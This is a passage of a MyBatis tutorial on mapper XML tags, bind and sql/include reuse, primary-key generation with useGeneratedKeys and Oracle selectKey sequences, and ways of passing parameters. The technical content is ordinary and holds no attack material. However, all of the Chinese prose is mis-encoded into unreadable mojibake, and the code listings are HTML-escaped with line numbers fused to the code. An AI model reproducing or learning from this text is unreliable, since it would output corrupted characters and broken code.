è¯¥å‘½åç©ºé—´çš„ç¼“å­˜é…ç½® cache-ref â€“ å¼•ç”¨å…¶å®ƒå‘½åç©ºé—´çš„ç¼“å­˜é…ç½® resultMap â€“ æè¿°å¦‚ä½•ä»æ•°æ®åº“ç»“æœé›†ä¸­åŠ è½½å¯¹è±¡ï¼Œæ˜¯æœ€å¤æ‚ä¹Ÿæ˜¯æœ€å¼ºå¤§çš„æ ‡ç­¾ parameterMap â€“ è€å¼é£æ ¼çš„å‚æ•°æ˜ å°„ï¼Œæ­¤æ ‡ç­¾å·²è¢«åºŸå¼ƒï¼Œå¹¶å¯èƒ½åœ¨å°†æ¥è¢«ç§»é™¤ï¼Œè¯·ä½¿ç”¨è¡Œå†…å‚æ•°æ˜ å°„ sql â€“ å¯è¢«å…¶å®ƒè¯­å¥å¼•ç”¨çš„å¯é‡ç”¨è¯­å¥å— insert â€“ æ˜ å°„æ’å…¥è¯­å¥ update â€“ æ˜ å°„æ›´æ–°è¯­å¥ delete â€“ æ˜ å°„åˆ é™¤è¯­å¥ select â€“ æ˜ å°„æŸ¥è¯¢è¯­å¥ å¢åˆ æ”¹æŸ¥æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-4ã€‚ select æ ‡ç­¾æŸ¥è¯¢æ ‡ç­¾æ˜¯ MyBatis ä¸­æœ€å¸¸ç”¨çš„æ ‡ç­¾ä¹‹ä¸€ï¼Œå…‰èƒ½æŠŠæ•°æ®å­˜åˆ°æ•°æ®åº“ä¸­ä»·å€¼å¹¶ä¸å¤§ï¼Œè¿˜è¦èƒ½é‡æ–°å–å‡ºæ¥æ‰æœ‰ç”¨ï¼Œå¤šæ•°åº”ç”¨ä¹Ÿéƒ½æ˜¯æŸ¥è¯¢æ¯”ä¿®æ”¹è¦é¢‘ç¹ã€‚MyBatis çš„åŸºæœ¬åŸåˆ™ä¹‹ä¸€æ˜¯ï¼šåœ¨æ¯ä¸ªæ’å…¥ã€æ›´æ–°æˆ–åˆ é™¤æ“ä½œä¹‹é—´ï¼Œé€šå¸¸ä¼šæ‰§è¡Œå¤šä¸ªæŸ¥è¯¢æ“ä½œã€‚å› æ­¤ï¼ŒMyBatis åœ¨æŸ¥è¯¢å’Œç»“æœæ˜ å°„åšäº†ç›¸å½“å¤šçš„æ”¹è¿›ã€‚ä¸€ä¸ªç®€å•æŸ¥è¯¢çš„ select æ ‡ç­¾æ˜¯éå¸¸ç®€å•çš„ã€‚æ¯”å¦‚ï¼š 123&lt;select id="selectPerson" parameterType="int" resultType="hashmap"&gt; SELECT * FROM PERSON WHERE ID = #{id}&lt;/select&gt; è¿™ä¸ªè¯­å¥åä¸º selectPersonï¼Œæ¥å—ä¸€ä¸ª intï¼ˆIntegerï¼‰ç±»å‹çš„å‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ª HashMap ç±»å‹çš„å¯¹è±¡ï¼Œå…¶ä¸­çš„é”®æ˜¯åˆ—åï¼Œå€¼ä¾¿æ˜¯ç»“æœè¡Œä¸­çš„å¯¹åº”å€¼ã€‚ç‰¹åˆ«æ³¨æ„å‚æ•°ç¬¦å· #{id}ï¼Œè¿™æ˜¯ç”¨æ¥å‘Šè¯‰ MyBatis åˆ›å»ºä¸€ä¸ªé¢„å¤„ç†è¯­å¥ï¼ˆPreparedStatementï¼‰å‚æ•°ï¼Œåœ¨ JDBC ä¸­ï¼Œè¿™æ ·çš„ä¸€ä¸ªå‚æ•°åœ¨ SQL ä¸­ä¼šç”±ä¸€ä¸ª ? æ¥æ ‡è¯†ï¼Œå¹¶è¢«ä¼ é€’åˆ°ä¸€ä¸ªæ–°çš„é¢„å¤„ç†è¯­å¥ä¸­ï¼Œå°±åƒè¿™æ ·ï¼š 1234long id = 1001;String selectPerson = "SELECT * FROM PERSON WHERE ID=?";PreparedStatement ps = conn.prepareStatement(selectPerson);ps.setInt(1, id); select æ ‡ç­¾å…è®¸é…ç½®å¾ˆå¤šå±æ€§æ¥é…ç½®æ¯æ¡è¯­å¥çš„è¡Œä¸ºç»†èŠ‚ï¼Œä¾‹å¦‚ï¼š 123456789101112&lt;select id="selectPerson" parameterType="int" parameterMap="deprecated" resultType="hashmap" resultMap="personResultMap" flushCache="false" useCache="true" timeout="10" fetchSize="256" statementType="PREPARED" resultSetType="FORWARD_ONLY"&gt; insertã€updateã€delete æ ‡ç­¾æ•°æ®æ›´æ”¹è¯­å¥ insertï¼Œupdate å’Œ delete çš„ä½¿ç”¨éå¸¸æ¥è¿‘ï¼š 1234567891011121314151617181920212223&lt;insert id="insertAuthor" parameterType="domain.blog.Author" flushCache="true" statementType="PREPARED" keyProperty="" keyColumn="" useGeneratedKeys="" timeout="20"&gt;&lt;update id="updateAuthor" parameterType="domain.blog.Author" flushCache="true" statementType="PREPARED" timeout="20"&gt;&lt;delete id="deleteAuthor" parameterType="domain.blog.Author" flushCache="true" statementType="PREPARED" timeout="20"&gt; ä¸‹é¢æ˜¯ insertï¼Œupdate å’Œ delete è¯­å¥çš„ä½¿ç”¨ç¤ºä¾‹ï¼š 1234567891011121314151617&lt;insert id="insertAuthor" parameterType="domain.blog.Author"&gt; insert into Author (id, username, password, email,bio) values (#{id}, #{username}, #{password}, #{email}, #{bio})&lt;/insert&gt;&lt;update id="updateAuthor" parameterType="domain.blog.Author"&gt; update Author set username = #{username}, password = #{password}, email = #{email}, bio = #{bio} where id = #{id}&lt;/update&gt;&lt;delete id="deleteAuthor"&gt; delete from Author where id = #{id}&lt;/delete&gt; æç¤º MyBatis å…è®¸å¢åˆ æ”¹çš„ DAO æ¥å£ç›´æ¥å®šä¹‰ä»¥ä¸‹ç±»å‹çš„è¿”å›å€¼ï¼ŒåŒ…æ‹¬ï¼šintã€longã€booleanã€Integerã€Longã€Booleanï¼Œè¿™å¯ç”¨äºåˆ¤æ–­å¢åˆ æ”¹æ“ä½œæ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚ Bind ç»‘å®šåœ¨é¡¹ç›®å¼€å‘ä¸­ï¼Œç»å¸¸ä¼šä½¿ç”¨åˆ° like æŸ¥è¯¢æ¡ä»¶æ¥å®ç°æ¨¡ç³ŠæŸ¥è¯¢ï¼Œä¾‹å¦‚ï¼š 12345public interface EmployeeMapper { public List&lt;Employee&gt; getByLastName(String lastName);} 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getByLastName" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where last_name like concat(\'%\', #{lastName}, \'%\') &lt;/select&gt;&lt;/mapper&gt; ç”±äº MySQL çš„ concat() å­—ç¬¦ä¸²è¿æ¥å‡½æ•°æ”¯æŒå¤šä¸ªå‚æ•°ï¼Œè€Œ Oracle çš„ concat() å‡½æ•°åªæ”¯æŒä¸¤ä¸ªå‚æ•°ï¼Œå› æ­¤ä¸Šè¿°çš„ SQL åœ¨ Oracle æ•°æ®åº“ä¼šæ‰§è¡Œå¤±è´¥ã€‚ç”±äºä¸åŒæ•°æ®åº“ä¹‹é—´çš„è¯­æ³•å·®å¼‚ï¼Œå¦‚æœæ›´æ¢æ•°æ®åº“ï¼Œæœ‰äº› SQL è¯­å¥å¯èƒ½å°±éœ€è¦é‡å†™ã€‚é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ bind æ ‡ç­¾æ¥é¿å…å› æ›´æ¢æ•°æ®åº“è€Œä¿®æ”¹ SQLï¼ŒåŒæ—¶ä¹Ÿèƒ½é˜²æ­¢ SQL æ³¨å…¥ã€‚ æç¤º bind æ ‡ç­¾å¯ä»¥ä½¿ç”¨ OGNL è¡¨è¾¾å¼åˆ›å»ºä¸€ä¸ªå˜é‡ï¼Œå¹¶å°†å…¶ç»‘å®šåˆ°ä¸Šä¸‹æ–‡ä¸­ bind æ ‡ç­¾çš„ name å±æ€§æ˜¯ç»‘å®šåˆ°ä¸Šä¸‹æ–‡çš„å˜é‡åï¼Œvalue æ˜¯ OGNL è¡¨è¾¾å¼ å°†ä¸Šè¿°çš„ SQL æ”¹ä¸º bind æ–¹å¼åï¼Œä»£ç å¦‚ä¸‹ã€‚ 1234567891011&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- å°† OGNL è¡¨è¾¾å¼çš„å€¼ç»‘å®šåˆ°ä¸€ä¸ªå˜é‡ä¸­ï¼Œè¿™æ ·æ–¹ä¾¿åé¢å¼•ç”¨è¿™ä¸ªå˜é‡çš„å€¼ --&gt; &lt;select id="getByLastName" resultType="com.clay.mybatis.bean.Employee"&gt; &lt;bind name="_lastName" value="\'%\' + lastName + \'%\'" /&gt; select id, last_name as lastName, gender, email from t_employee where last_name like #{_lastName} &lt;/select&gt;&lt;/mapper&gt; SQL é‡ç”¨sql æ ‡ç­¾å¯ä»¥ç”¨æ¥å®šä¹‰å¯é‡ç”¨çš„ SQL ä»£ç ç‰‡æ®µï¼Œä»¥ä¾¿åœ¨å…¶å®ƒè¯­å¥ä¸­ä½¿ç”¨ã€‚å‚æ•°å¯ä»¥é™æ€åœ°ï¼ˆåœ¨åŠ è½½çš„æ—¶å€™ï¼‰ç¡®å®šä¸‹æ¥ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä¸åŒçš„ include æ ‡ç­¾ä¸­å®šä¹‰ä¸åŒçš„å‚æ•°å€¼ã€‚æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-5ã€‚ ä½¿ç”¨æ¡ˆä¾‹ä¸€1&lt;sql id="userColumns"&gt; id, username, password &lt;/sql&gt; ä¸Šé¢çš„ SQL ç‰‡æ®µå¯ä»¥åœ¨å…¶å®ƒè¯­å¥ä¸­ä½¿ç”¨ï¼Œä¾‹å¦‚ï¼š 12345&lt;select id="selectUsers" resultType="map"&gt; select &lt;include refid="userColumns"&gt;&lt;/include&gt; from some_table&lt;/select&gt; ä½¿ç”¨æ¡ˆä¾‹äºŒæˆ–è€…é…åˆ if æ ‡ç­¾ä¸€èµ·ä½¿ç”¨ï¼Œ_databaseId æ˜¯ MyBatis çš„å†…ç½®å‚æ•°ï¼š 12345678&lt;sql id="userColumns"&gt; &lt;if test="_databaseId == \'oracle\'"&gt; id, username, email &lt;/if&gt; &lt;if test="_databaseId == \'mysql\'"&gt; id, username, gender &lt;/if&gt;&lt;/sql&gt; ä½¿ç”¨æ¡ˆä¾‹ä¸‰æˆ–è€…ç¨å¾®å¤æ‚ä¸€ç‚¹çš„ä½¿ç”¨ï¼ˆå¸¦å‚æ•°æ›¿æ¢ï¼‰ï¼Œä¾‹å¦‚ï¼š 1&lt;sql id="userColumns"&gt; ${alias}.id, ${alias}.username, ${alias}.password &lt;/sql&gt; 123456789101112&lt;select id="selectUsers" resultType="map"&gt; select &lt;include refid="userColumns"&gt; &lt;property name="alias" value="t1" /&gt; &lt;/include&gt; , &lt;include refid="userColumns"&gt; &lt;property name="alias" value="t2" /&gt; &lt;/include&gt; from some_table t1 cross join some_table t2&lt;/select&gt; ä¸Šé¢çš„å†™æ³•ï¼Œæœ€ç»ˆå‘å‡ºçš„ SQL è¯­å¥å¦‚ä¸‹ï¼š 12345select t1.id, t1.username, t1.password, t2.id, t2.username, t2.passwordfrom some_table t1cross join some_table t2 ä½¿ç”¨æ¡ˆä¾‹å››æˆ–è€…åœ¨ include æ ‡ç­¾çš„ refid å±æ€§æˆ–å†…éƒ¨è¯­å¥ä¸­ä½¿ç”¨å±æ€§å€¼ï¼Œä¾‹å¦‚ï¼š 12345678910111213141516&lt;sql id="sometable"&gt; ${prefix}Table&lt;/sql&gt;&lt;sql id="someinclude"&gt; from &lt;include refid="${include_target}"/&gt;&lt;/sql&gt;&lt;select id="select" resultType="map"&gt; select id, username, email &lt;include refid="someinclude"&gt; &lt;property name="prefix" value="User"/&gt; &lt;property name="include_target" value="sometable"/&gt; &lt;/include&gt;&lt;/select&gt; ä¸Šé¢çš„å†™æ³•ï¼Œæœ€ç»ˆå‘å‡ºçš„ SQL è¯­å¥å¦‚ä¸‹ï¼š 1select id, username, email from UserTable; ä¸»é”®ç”Ÿæˆå¦‚å‰æ‰€è¿°ï¼Œæ’å…¥è¯­å¥çš„é…ç½®è§„åˆ™æ›´åŠ ä¸°å¯Œï¼Œåœ¨æ’å…¥è¯­å¥é‡Œé¢æœ‰ä¸€äº›é¢å¤–çš„å±æ€§å’Œå­æ ‡ç­¾ç”¨æ¥å¤„ç†ä¸»é”®çš„ç”Ÿæˆï¼Œå¹¶ä¸”æä¾›äº†å¤šç§ç”Ÿæˆæ–¹å¼ã€‚æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-5ã€‚ è‡ªå¢ä¸»é”®ç”Ÿæˆé¦–å…ˆï¼Œå¦‚æœæ•°æ®åº“æ”¯æŒè‡ªå¢ä¸»é”®çš„å­—æ®µï¼ˆæ¯”å¦‚ MySQL å’Œ SQL Serverï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥è®¾ç½® useGeneratedKeys="true"ï¼Œç„¶åå†æŠŠ keyProperty è®¾ç½®ä¸ºç›®æ ‡å±æ€§å°±å¯ä»¥äº†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸Šé¢çš„ Author è¡¨å·²ç»åœ¨ id åˆ—ä¸Šä½¿ç”¨äº†è‡ªå¢é•¿ï¼Œé‚£ä¹ˆæ’å…¥è¯­å¥å¯ä»¥ä¿®æ”¹ä¸ºï¼š 1234&lt;insert id="insertAuthor" parameterType="domain.blog.Author" useGeneratedKeys="true" keyProperty="id"&gt; insert into Author (username, password, email, bio) values (#{username}, #{password}, #{email}, #{bio})&lt;/insert&gt; SQL æ˜ å°„æ–‡ä»¶é‡Œé…ç½®äº†è‡ªå¢ä¸»é”®åï¼Œåœ¨ Java ä»£ç é‡Œå°±å¯ä»¥ç›´æ¥é€šè¿‡ JavaBean å¯¹è±¡è·å–åˆ°æ•°æ®åº“é‡Œè‡ªå¢åçš„ä¸»é”®å€¼ã€‚ 123Author author = new Author("Tom", "123456", "tom@gmail.com", "");mapper.insertAuthor(author);System.out.println("id = " + author.getId()); å¦‚æœæ•°æ®åº“è¿˜æ”¯æŒå¤šè¡Œæ’å…¥ï¼Œåˆ™ä¹Ÿå¯ä»¥ä¼ å…¥ä¸€ä¸ª Author æ•°ç»„æˆ–é›†åˆï¼Œå¹¶è¿”å›è‡ªåŠ¨ç”Ÿæˆçš„ä¸»é”®ã€‚ 123456&lt;insert id="insertAuthor" useGeneratedKeys="true" keyProperty="id"&gt; insert into Author (username, password, email, bio) values &lt;foreach item="item" collection="list" separator=","&gt; (#{item.username}, #{item.password}, #{item.email}, #{item.bio}) &lt;/foreach&gt;&lt;/insert&gt; éè‡ªå¢ä¸»é”®ç”Ÿæˆç”Ÿæˆéšæœºä¸»é”®å¯¹äºä¸æ”¯æŒè‡ªåŠ¨ç”Ÿæˆä¸»é”®çš„æ•°æ®åº“ï¼ˆOracleï¼‰å’Œå¯èƒ½ä¸æ”¯æŒè‡ªåŠ¨ç”Ÿæˆä¸»é”®çš„ JDBC é©±åŠ¨ï¼ŒMyBatis æœ‰å¦å¤–ä¸€ç§æ–¹æ³•æ¥ç”Ÿæˆä¸»é”®ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç®€å•ï¼ˆä¹Ÿå¾ˆå‚»ï¼‰çš„ç¤ºä¾‹ï¼Œå®ƒå¯ä»¥ç”Ÿæˆä¸€ä¸ªéšæœº IDï¼ˆä¸å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œè¿™é‡Œåªæ˜¯ä¸ºäº†å±•ç¤º MyBatis å¤„ç†é—®é¢˜çš„çµæ´»æ€§å’Œå®½å®¹åº¦ï¼‰ï¼š 12345678910&lt;insert id="insertAuthor"&gt; &lt;!-- ä¼šè‡ªåŠ¨å°†æŸ¥å‡ºçš„ä¸»é”®å€¼å°è£…ç»™JavaBeançš„æŒ‡å®šå±æ€§ï¼ˆå¦‚ idï¼‰ --&gt; &lt;selectKey keyProperty="id" resultType="int" order="BEFORE"&gt; select CAST(RANDOM()*1000000 as INTEGER) a from SYSIBM.SYSDUMMY1 &lt;/selectKey&gt; insert into Author (id, username, password, email,bio, favourite_section) values (#{id}, #{username}, #{password}, #{email}, #{bio}, #{favouriteSection, jdbcType=VARCHAR})&lt;/insert&gt; åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œé¦–å…ˆä¼šæ‰§è¡Œ selectKey æ ‡ç­¾ä¸­çš„è¯­å¥ï¼Œå¹¶è®¾ç½® Author çš„ id å±æ€§ï¼Œç„¶åæ‰ä¼šè°ƒç”¨æ’å…¥è¯­å¥ã€‚è¿™æ ·å°±å®ç°äº†æ•°æ®åº“è‡ªåŠ¨ç”Ÿæˆä¸»é”®ç±»ä¼¼çš„è¡Œä¸ºï¼ŒåŒæ—¶ä¿æŒäº† Java ä»£ç çš„ç®€æ´ã€‚selectKey æ ‡ç­¾æè¿°å¦‚ä¸‹ï¼š 12345&lt;selectKey keyProperty="id" resultType="int" order="BEFORE" statementType="PREPARED"&gt; ç”Ÿæˆ Oracle ä¸»é”®Oracle æ•°æ®åº“ä¸æ”¯æŒè‡ªå¢ä¸»é”®ï¼Œä½†å¯ä»¥ä½¿ç”¨åºåˆ—æ¥æ¨¡æ‹Ÿè‡ªå¢ï¼Œå³æ¯æ¬¡æ’å…¥çš„æ•°æ®çš„ä¸»é”®éƒ½æ˜¯ä»åºåˆ—ä¸­æ‹¿åˆ°çš„å€¼ã€‚ ç¬¬ä¸€ç§æ–¹å¼ï¼ˆBeforeï¼‰ 12345678&lt;insert id="addEmp" databaseId="oracle" parameterType="com.clay.mybatis.bean.Employee"&gt; &lt;!-- æŸ¥è¯¢ä¸»é”®çš„SQLè¯­å¥ï¼Œä¼šè‡ªåŠ¨å°†æŸ¥å‡ºçš„ä¸»é”®å€¼å°è£…ç»™JavaBeançš„æŒ‡å®šå±æ€§ï¼ˆå¦‚ idï¼‰ --&gt; &lt;selectKey keyProperty="id" order="BEFORE" resultType="Integer"&gt; select EMPLOYEES_SEQ.nextval from dual &lt;/selectKey&gt; insert into employees (id, last_name, email) values(#{id}, #{lastName}, #{email})&lt;/insert&gt; å…ˆæ‰§è¡Œ selectKey æ ‡ç­¾ä¸­æŸ¥è¯¢ä¸»é”®çš„ SQL è¯­å¥ï¼ˆä»åºåˆ—ä¸­æ‹¿åˆ°ï¼‰ï¼Œç„¶åå°†æŸ¥å‡ºçš„ä¸»é”®å€¼å°è£…ç»™ JavaBean çš„æŒ‡å®šå±æ€§ï¼ˆå¦‚ idï¼‰ï¼Œæœ€åå†æ‰§è¡Œæ’å…¥æ•°æ®çš„ SQL è¯­å¥ã€‚ ç¬¬äºŒç§æ–¹å¼ï¼ˆAfterï¼‰ 12345678&lt;insert id="addEmp" databaseId="oracle" parameterType="com.clay.mybatis.bean.Employee"&gt; &lt;!-- æŸ¥è¯¢ä¸»é”®çš„SQLè¯­å¥ï¼Œä¼šè‡ªåŠ¨å°†æŸ¥å‡ºçš„ä¸»é”®å€¼å°è£…ç»™JavaBeançš„æŒ‡å®šå±æ€§ï¼ˆå¦‚ idï¼‰ --&gt; &lt;selectKey keyProperty="id" order="AFTER" resultType="Integer"&gt; select EMPLOYEES_SEQ.currval from dual &lt;/selectKey&gt; insert into employees (id, last_name, email) values(employees_seq.nextval, #{lastName}, #{email})&lt;/insert&gt; å…ˆæ‰§è¡Œæ’å…¥æ•°æ®çš„ SQL è¯­å¥ï¼Œå†æ‰§è¡Œ selectKey æ ‡ç­¾ä¸­æŸ¥è¯¢ä¸»é”®çš„ SQL è¯­å¥ï¼ˆä»åºåˆ—ä¸­æ‹¿åˆ°ï¼‰ï¼Œæœ€åå°†æŸ¥å‡ºçš„ä¸»é”®å€¼å°è£…ç»™ JavaBean çš„æŒ‡å®šå±æ€§ï¼ˆå¦‚ idï¼‰ã€‚ ç‰¹åˆ«æ³¨æ„ å¦‚æœæ˜¯æ‰¹é‡æ’å…¥å¤šæ¡æ•°æ®ï¼Œé‡‡ç”¨ç¬¬äºŒç§æ–¹å¼ï¼ˆAfterï¼‰çš„å†™æ³•ï¼Œä¼šå¯¼è‡´åœ¨ Java ä»£ç é‡Œåªèƒ½æ‹¿åˆ°æœ€åä¸€æ¡æ’å…¥è®°å½•çš„ä¸»é”®å€¼ï¼Œå› æ­¤æ¨èä½¿ç”¨ç¬¬ä¸€ç§æ–¹å¼ï¼ˆBeforeï¼‰ã€‚ å‚æ•°å¤„ç†æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-6ã€‚ å•ä¸ªå‚æ•° MyBatis å¯ä»¥æ¥å—åŸºæœ¬ç±»å‹ã€å¯¹è±¡ç±»å‹ã€é›†åˆç±»å‹ã€æ•°ç»„ç±»å‹çš„å‚æ•°å€¼ï¼ŒMyBatis å¯ç›´æ¥ä½¿ç”¨è¿™äº›ç±»å‹çš„å‚æ•°ï¼Œä¸éœ€è¦ç»è¿‡ä»»ä½•å¤„ç† é’ˆå¯¹åŸºæœ¬ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨ #{å‚æ•°å / ä»»æ„å} å–å‡ºä¼ å…¥çš„å‚æ•°å€¼ é’ˆå¯¹å¯¹è±¡ç±»å‹ã€é›†åˆç±»å‹ã€æ•°ç»„ç±»å‹çš„å¤„ç†ï¼Œè¯¦ç»†è¯´æ˜è¯·çœ‹åæ–‡çš„ä»‹ç» 12345public interface EmployeeMapper { public Employee getEmpById(Long id);} 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpById" parameterType="Long" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; å¤šä¸ªå‚æ•°é»˜è®¤çš„å¤„ç†æ–¹å¼ MyBatis ä¼šåšç‰¹æ®Šå¤„ç† å¤šä¸ªå‚æ•°ä¼šè¢«å°è£…æˆä¸€ä¸ª Mapï¼Œå…¶ä¸­ key é»˜è®¤æ˜¯ param1 ... paramNï¼Œæˆ–è€…æ˜¯ä½¿ç”¨å¸¦ç´¢å¼•çš„ arg0 ... argNï¼Œè€Œ value åˆ™æ˜¯ Java æ–¹æ³•ä¾æ¬¡ä¼ å…¥çš„å‚æ•°å€¼ ä¸¾ä¸ªä¾‹å­ï¼Œ#{param1} å¯ä»¥ä» Map ä¸­è·å–ç¬¬ä¸€ä¸ª key çš„å€¼ï¼ˆJava æ–¹æ³•ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰ 12345public interface EmployeeMapper { public Employee getEmpByIdAndEmail(Long id, String email);} 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpByIdAndEmail" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{param1} and email = #{param2} &lt;/select&gt;&lt;/mapper&gt; ä½¿ç”¨æ³¨è§£çš„å¤„ç†æ–¹å¼é€šè¿‡ @Param æ³¨è§£ï¼Œæ˜ç¡®æŒ‡å®š MyBatis å°è£…å‚æ•°æ—¶ Map çš„ keyï¼Œç„¶åé€šè¿‡ #{key} å–å‡ºä¼ å…¥çš„å‚æ•°å€¼ï¼Œæ­¤æ–¹å¼ä¹Ÿè¢«ç§°ä¸º å‘½åå‚æ•°ï¼Œä¾‹å¦‚ï¼š 12345public interface EmployeeMapper { public Employee getEmpByIdAndEmailByAnnotation(@Param("id") Long id, @Param("email") String email);} 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpByIdAndEmailByAnnotation" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} and email = #{email} &lt;/select&gt;&lt;/mapper&gt; æç¤º å½“ä¼ å…¥å¤šä¸ªå‚æ•°æ—¶ï¼Œå»ºè®®ä½¿ç”¨ @Param æ³¨è§£ï¼Œè¿™æ ·ä¼šä½¿ SQL æ˜ å°„æ–‡ä»¶çš„å¯è¯»æ€§æ›´å¼ºã€‚ ä½¿ç”¨ POJO ä¼ é€’å‚æ•°å¦‚æœæœ‰å¤šä¸ªå‚æ•°æ­£å¥½æ˜¯ä¸šåŠ¡é€»è¾‘çš„æ•°æ®æ¨¡å‹ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ç›´æ¥ä¼ å…¥ POJO å¯¹è±¡ï¼Œç„¶åé€šè¿‡ #{å±æ€§å} å–å‡ºä¼ å…¥çš„ POJO çš„å±æ€§å€¼ï¼Œä¾‹å¦‚ï¼š 12345public interface EmployeeMapper { public boolean addEmp(Employee employee);} 12345678&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;insert id="addEmp" parameterType="com.clay.mybatis.bean.Employee" useGeneratedKeys="true" keyProperty="id"&gt; insert into t_employee (last_name, gender, email) values(#{lastName}, #{gender}, #{email}) &lt;/insert&gt;&lt;/mapper&gt; ä½¿ç”¨ Map ä¼ é€’å‚æ•°å¦‚æœæœ‰å¤šä¸ªå‚æ•°ä¸”éƒ½ä¸æ˜¯ä¸šåŠ¡æ¨¡å‹ä¸­çš„æ•°æ®ï¼Œå³æ²¡æœ‰ POJO å¯¹è±¡ï¼Œä¸ºäº†å¼€å‘æ–¹ä¾¿ï¼Œè¿˜å¯ä»¥ç›´æ¥ä¼ å…¥ Map å¯¹è±¡ï¼Œç„¶åé€šè¿‡ #{key} å–å‡ºä¼ å…¥çš„å‚æ•°å€¼ï¼Œä¾‹å¦‚ï¼š 12345public interface EmployeeMapper { public Employee getEmpByIdAndEmailByMap(Map&lt;String, Object&gt; params);} 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpByIdAndEmailByMap" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} and email = #{email} &lt;/select&gt;&lt;/mapper&gt; æç¤º å¦‚æœæœ‰å¤šä¸ªå‚æ•°ä¸”éƒ½ä¸æ˜¯ä¸šåŠ¡æ¨¡å‹ä¸­çš„æ•°æ®ï¼Œä½†æ˜¯ä¼šç»å¸¸ä½¿ç”¨ï¼Œæ­¤æ—¶ä¸å»ºè®®ä½¿ç”¨ Map æ¥å°è£…å‚æ•°ï¼Œè€Œæ˜¯æ¨èç¼–å†™ DTOï¼ˆData Transfer Objectï¼‰æ•°æ®ä¼ è¾“å¯¹è±¡æ¥å°è£…å¤šä¸ªå‚æ•°ã€‚ ä½¿ç”¨ List ä¼ é€’å‚æ•° å¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯ Collectionï¼ˆListã€Setï¼‰ é›†åˆç±»å‹æˆ–è€…æ˜¯æ•°ç»„ç±»å‹ï¼ŒMyBatis ä¼šåšç‰¹æ®Šå¤„ç†ï¼Œä¹Ÿå°±æ˜¯ä¼šæŠŠä¼ å…¥çš„é›†åˆå¯¹è±¡æˆ–è€…æ•°ç»„å°è£…åœ¨ Map ä¸­ã€‚ å¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯ Collectionï¼ˆListã€Setï¼‰ ç±»å‹ï¼Œåˆ™å¯ä»¥ç»Ÿä¸€ä½¿ç”¨ arg0 ... argN ä½œä¸º key å–å‡ºå‚æ•°å€¼ã€‚ å¦‚æœä¼ å…¥çš„æ˜¯å•å‚æ•°ä¸”å‚æ•°æ˜¯ List ç±»å‹ï¼Œåˆ™è¿˜å¯ä»¥ä½¿ç”¨ collection æˆ–è€… list ä½œä¸º key å–å‡ºå‚æ•°å€¼ã€‚ å¦‚æœä¼ å…¥çš„æ˜¯å•å‚æ•°ä¸”å‚æ•°æ˜¯æ•°ç»„ç±»å‹ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ array ä½œä¸º key å–å‡ºå‚æ•°å€¼ã€‚ 12Java å‚æ•°ï¼špublic Employee getEmpById(List&lt;Integer&gt; ids);SQL å–å€¼ï¼š#{arg0[0]/collection[0]/list[0]} ==&gt; å–å‡ºç¬¬ä¸€ä¸ªIDçš„å€¼ 12Java å‚æ•°ï¼špublic Employee getEmpById(Long[] ids);SQL å–å€¼ï¼š#{array[0]} ==&gt; å–å‡ºç¬¬ä¸€ä¸ªIDçš„å€¼ å…¶ä»–å‚æ•°ä¼ é€’æ–¹å¼12Java Java å‚æ•°ï¼špublic Employee getEmp(@Param("id")Integer id, String lastName);SQL å–å€¼ï¼šid ==&gt; #{id/param1}, lastName ==&gt; #{param2} 12Java å‚æ•°ï¼špublic Employee getEmp(Integer id, @Param("emp")Employee emp);SQL å–å€¼ï¼šid ==&gt; #{param1}, lastName ==&gt; #{param2.lastName/emp.lastName} å†…ç½®å‚æ•°MyBatis æä¾›äº†ä¸¤ä¸ªå†…ç½®å‚æ•°ï¼Œåˆ†åˆ«æ˜¯ _parameter å’Œ _databaseIdï¼Œä¸¤è€…çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼š _parameterï¼šä»£è¡¨æ‰€æœ‰å‚æ•° 